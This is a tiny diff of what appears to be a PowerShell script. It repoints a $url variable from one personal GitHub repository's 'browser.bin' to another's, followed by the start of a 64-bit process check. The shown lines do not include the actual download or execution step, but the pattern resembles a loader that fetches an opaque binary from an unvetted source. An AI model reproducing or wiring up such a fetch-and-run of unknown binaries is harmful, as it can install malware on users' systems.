@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/Zakelijkgg/niks/main/browser.bin"
+$url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
 
 if (-not [Environment]::Is64BitProcess) {
     pause
